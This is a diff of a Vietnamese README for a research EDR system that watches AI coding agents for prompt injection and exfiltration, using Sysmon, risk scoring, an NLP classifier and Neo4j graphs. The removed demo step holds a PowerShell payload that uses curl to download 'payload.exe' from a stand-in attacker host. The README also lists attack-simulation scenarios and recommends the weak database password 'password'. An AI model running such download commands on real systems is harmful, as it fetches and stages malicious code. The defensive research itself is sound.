@@ -1,75 +1,179 @@
-# Security for AI Agent (EDR)
+# Security for AI Agent — AI Runtime Threat Detection & Response Platform
 
-Hệ thống **AI Runtime Security (EDR)** chuyên dụng để bảo vệ môi trường lập trình có sự hỗ trợ của AI (AI-assisted Development Environment) khỏi các cuộc tấn công **Indirect Prompt Injection**, **Data Exfiltration** và các hành vi thực thi mã độc do AI Agent tự động sinh ra.
+Hệ thống **AI Runtime Security (EDR)** chuyên dụng bảo vệ môi trường lập trình có sự hỗ trợ của AI (AI-assisted Development Environment) khỏi các cuộc tấn công **Indirect Prompt Injection**, **Data Exfiltration** và các hành vi thực thi mã độc do AI Agent tự động sinh ra.
 
-Dự án nghiên cứu này kết hợp giám sát ở mức OS Kernel (Sysmon), lưu vết đồ thị (Neo4j Graph Database), và phân tích ngữ nghĩa dòng lệnh bằng Mô hình Trí tuệ Nhân tạo (Deep Learning NLP).
-
----
-
-## Kiến trúc 8 Lớp (8-Phases Architecture)
-
-1. **AI Telemetry Layer**: Hook và thu thập dữ liệu hành vi của AI Agent.
-2. **Sysmon OS Collector**: Đọc luồng sự kiện bảo mật trực tiếp từ Kernel của Windows (Event ID 1).
-3. **Correlation Engine**: Sử dụng thuật toán Sliding Window để nối log AI và log OS theo thời gian thực.
-4. **Heuristic Detection Engine**: Quét và chặn các payload/công cụ độc hại cơ bản.
-5. **AI Security Analyzer (NLP)**: Dùng mô hình **DeBERTa / DistilBERT** (Zero-shot Classification) để phân tích ngữ nghĩa (Semantics) của lệnh thực thi và gán nhãn mức độ đe dọa (VD: *Remote Code Execution*).
-6. **Containment Engine**: Tự động gọi API hệ điều hành để tiêu diệt (Kill) tiến trình độc hại trong chớp mắt mà không làm sập tiến trình mẹ.
-7. **Response Engine**: Quản lý điều phối cảnh báo và đánh giá Risk Score.
-8. **Neo4j Graph Investigation**: Đẩy toàn bộ đường dây tấn công thành Đồ thị (Nodes & Relationships) để SOC Analyst điều tra nguyên nhân gốc rễ (Root Cause Analysis).
+Dự án kết hợp: giám sát Kernel-level (Sysmon), lưu vết Đồ thị Tấn công (Neo4j), và phân tích ngữ nghĩa dòng lệnh bằng mô hình AI NLP (DeBERTa v3).
 
 ---
 
-## Yêu cầu Hệ thống (Prerequisites)
+## Kiến trúc 8 Tầng (8-Phase Pipeline)
 
-Để hệ thống hoạt động đúng như một sản phẩm thương mại, máy chủ/Endpoint cần phải cài đặt các thành phần cốt lõi sau:
+```
+[AI Agent Action]     [OS Kernel Action]
+      │                      │
+      ▼                      ▼
+┌─────────────┐   ┌──────────────────┐
+│ AI Telemetry│   │  Sysmon Collector│   ← Thu thập sự kiện
+│  Layer      │   │  (Event ID 1,3,11)│
+└──────┬──────┘   └────────┬─────────┘
+       │                   │
+       └────────┬──────────┘
+                ▼
+       ┌─────────────────┐
+       │ Correlation     │   ← Liên kết Intent–Action (Δt ≤ 2s)
+       │   Engine        │
+       └────────┬────────┘
+                ▼
+       ┌─────────────────┐
+       │  Detection      │   ← Risk Scoring (4 biến số)
+       │   Engine        │       Rule(20) + Process(20) + Net(20) + Corr(30)
+       └────────┬────────┘
+                │
+       ┌────────┼────────┬──────────────┐
+       ▼        ▼        ▼              ▼
+  ┌─────────┐ ┌──────┐ ┌───────┐  ┌──────────┐
+  │Contain- │ │Neo4j │ │  NLP  │  │  Alert   │
+  │  ment   │ │Graph │ │Analyz-│  │  Queue   │
+  │(kill)   │ │      │ │  er   │  │  (JSON)  │
+  └─────────┘ └──────┘ └───────┘  └──────────┘
+```
 
-### 1. Cài đặt Sysmon (Bắt buộc)
-Hệ điều hành Windows mặc định không có Sysmon. Bạn cần cài đặt Sysmon để hệ thống có thể lắng nghe luồng sự kiện Process Creation.
-- Tải [Sysmon từ Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon).
-- Mở PowerShell (Admin) tại thư mục vừa giải nén và chạy lệnh:
-  ```powershell
-  Sysmon64.exe -accepteula -i
-  ```
-
-### 2. Cài đặt Neo4j Desktop (Khuyên dùng)
-Dùng để vẽ đồ thị mạng nhện điều tra sự cố.
-- Tải và cài đặt [Neo4j Desktop](https://neo4j.com/download/).
-- Tạo một Project mới, tạo một Local Database với mật khẩu là `password`.
-- Khởi động Database (trạng thái `RUNNING`).
+| Tầng | Module | Chức năng |
+|------|--------|-----------|
+| 1 | `ai_telemetry/agent_logger.py` | Nhận AI Telemetry Event từ AI Agent qua IPC |
+| 2 | `collector/sysmon_listener.py` | Đọc luồng sự kiện từ Sysmon (Kernel-level) |
+| 3 | `correlation/correlation_engine.py` | Sliding Window Correlation (Δt ≤ 2 giây) |
+| 4 | `detector/rule_engine.py` | Heuristic Risk Scoring, phát hiện payload |
+| 5 | `analyzer/nlp_classifier.py` | Zero-shot NLP (DeBERTa v3) phân loại mối đe dọa |
+| 6 | `detector/containment.py` | Kill Process độc hại qua psutil API |
+| 7 | `graph/graph_builder.py` | Đẩy Incident lên Neo4j Graph Database |
+| 8 | `alert_queue/` | Lưu file JSON cho SOC điều tra offline |
 
 ---
 
-## Hướng dẫn Cài đặt & Triển khai
+## Yêu cầu Hệ thống
 
-**Bước 1: Clone Repository & Cài đặt thư viện**
-Mở Terminal/PowerShell và chạy lệnh:
-```bash
+### Bắt buộc: Cài Sysmon
+```powershell
+# Tải Sysmon từ Microsoft Sysinternals, giải nén rồi chạy:
+Sysmon64.exe -accepteula -i
+```
+
+### Khuyên dùng: Neo4j Desktop
+Tải tại [neo4j.com/download](https://neo4j.com/download/) → Tạo Local Database với password = `password` → Start.
+
+---
+
+## Cài đặt
+
+```powershell
 git clone https://github.com/sonle325/Security-for-AI-Agent-.git
 cd Security-for-AI-Agent-
 pip install -r requirements.txt
-```
 
-**Bước 2: Pre-load AI Model (Tùy chọn)**
-Mô hình Deep Learning nặng khoảng 250MB. Bạn nên tải trước vào cache để tránh gián đoạn lúc hệ thống EDR đang chạy:
-```bash
+# (Khuyên dùng) Tải trước AI Model ~150MB vào cache
 python download_model.py
 ```
 
-**Bước 3: Kích hoạt Hệ thống EDR**
-Mở **PowerShell bằng quyền Administrator** và chạy lệnh:
-```bash
+---
+
+## Khởi động EDR
+
+**Bắt buộc chạy bằng quyền Administrator** (để đọc Sysmon Event Log và Kill Process):
+
+```powershell
+# Mở PowerShell as Administrator
 python main.py
 ```
-> **Lưu ý:** Bắt buộc phải chạy bằng quyền Administrator để Python có đủ đặc quyền đọc Event Log của Windows và Kill Process mã độc.
+
+Khi thấy dòng sau, EDR đã sẵn sàng:
+```
+[AI Analyzer] [+] NLP Pipeline tải thành công!
+[*] EDR Engine is FULLY OPERATIONAL (8/8 Phases).
+[*] Chế độ BACKGROUND: Tự động đánh hơi và tiêu diệt mọi tiến trình độc hại!
+```
 
 ---
 
-## Hướng dẫn Demo Tấn công & Phòng thủ
+## Demo Tấn công & Phòng thủ
 
-1. Sau khi hệ thống hiện dòng chữ `[AI Analyzer]  NLP Pipeline tải thành công!`.
-2. Bấm phím **Enter** trên cửa sổ EDR để giả lập việc AI Agent vừa sinh ra một lệnh.
-3. Trong vòng 5 giây, mở hộp thoại `Run` (`Windows + R`) hoặc một cửa sổ PowerShell khác, dán Payload độc hại sau vào và Enter:
-   ```powershell
-   powershell.exe -NoExit -Command "curl http://attacker.com/payload.exe; echo 'Đang tải mã độc...'"
-   ```
-4. Quay lại cửa sổ EDR để chứng kiến tiến trình bị chém đứt đầu và đồ thị sự cố được đẩy lên Neo4j. Mở Neo4j Browser và dùng lệnh `MATCH (n) RETURN n` để xem kết quả điều tra!
+Mở **Terminal thứ 2** (không cần Admin) và chạy script Demo:
+
+```powershell
+# Chạy toàn bộ 5 kịch bản tấn công liên tiếp
+python attack_simulation/demo_runner.py --scenario all
+
+# Hoặc chọn từng kịch bản cụ thể:
+python attack_simulation/demo_runner.py --scenario 1   # Prompt Injection
+python attack_simulation/demo_runner.py --scenario 2   # Sensitive File Exfiltration
+python attack_simulation/demo_runner.py --scenario 3   # Suspicious Tool Usage
+python attack_simulation/demo_runner.py --scenario 4   # Executable Download (C2 Callback)
+python attack_simulation/demo_runner.py --scenario 5   # Full Attack Chain
+```
+
+### Kết quả kỳ vọng ở Terminal EDR:
+```
+[CorrelationEngine] [!] PHÁT HIỆN TIẾN TRÌNH CHẠY NGẦM ĐÁNG NGỜ!
+[DetectionEngine]   [!] CẢNH BÁO MỨC ĐỘ CRITICAL: INC-0001
+   [!] Công thức: Rule(20) + Process(20) + Net(20) + Corr(0) = 60 điểm
+[ResponseEngine]    [+] ĐÃ TIÊU DIỆT THÀNH CÔNG TIẾN TRÌNH ĐỘC HẠI!
+[AI Analyzer]       [+] Threat Label: REMOTE CODE EXECUTION (Confidence: 97.1%)
+```
+
+---
+
+## Kiểm tra kết quả sau Demo
+
+```powershell
+# Xem file Alert JSON được sinh ra tự động
+ls alert_queue/
+cat alert_queue/INC-0001.json
+
+# Xem Incident Graph (nếu Neo4j đang chạy)
+# Mở Neo4j Browser → http://localhost:7474
+# Chạy: MATCH (n) RETURN n LIMIT 50
+```
+
+---
+
+## Cấu trúc Thư mục
+
+```
+AI_Runtime_Security/
+├── main.py                          # Điểm khởi động, orchestrator chính
+├── download_model.py                # Script tải AI Model vào cache
+├── requirements.txt                 # Thư viện Python cần thiết
+│
+├── ai_telemetry/                    # Tầng 1: Thu thập AI Telemetry
+│   ├── agent_logger.py              # Nhận sự kiện từ AI Agent (IPC Channel)
+│   └── event_normalizer.py          # Chuẩn hóa sự kiện về schema thống nhất
+│
+├── collector/                       # Tầng 2: Thu thập Sysmon
+│   ├── sysmon_listener.py           # Subscribe Sysmon Event Log (kernel-level)
+│   └── event_parser.py              # Parse XML Sysmon Event → Dict chuẩn hóa
+│
+├── correlation/                     # Tầng 3: Liên kết sự kiện
+│   └── correlation_engine.py        # Sliding Window Correlation (Δt ≤ 2s)
+│
+├── detector/                        # Tầng 4 & 6: Phát hiện + Ngăn chặn
+│   ├── rule_engine.py               # Heuristic Risk Scoring (4 biến số)
+│   └── containment.py               # Kill Process qua psutil
+│
+├── analyzer/                        # Tầng 5: Phân tích NLP
+│   ├── nlp_classifier.py            # Zero-shot DeBERTa v3 threat classification
+│   └── incident_summary.py          # Tổng hợp báo cáo Incident ra file JSON
+│
+├── graph/                           # Tầng 7: Đồ thị điều tra
+│   ├── graph_builder.py             # Orchestrator đẩy Incident lên Neo4j
+│   └── neo4j_loader.py             # Xây dựng & thực thi Cypher Query
+│
+├── alert_queue/                     # Tầng 8: Queue cảnh báo offline
+│   └── INC-XXXX.json               # Mỗi Incident CRITICAL → 1 file JSON
+│
+├── reports/                         # Báo cáo tổng hợp sự cố (SOC)
+│   └── RPT-INC-XXXX.json
+│
+└── attack_simulation/               # Công cụ Demo & Testing
+    ├── demo_runner.py               # 5 kịch bản tấn công tự động
+    └── DEMO_CHEATSHEET.md           # Cheat sheet cho buổi bảo vệ
+```
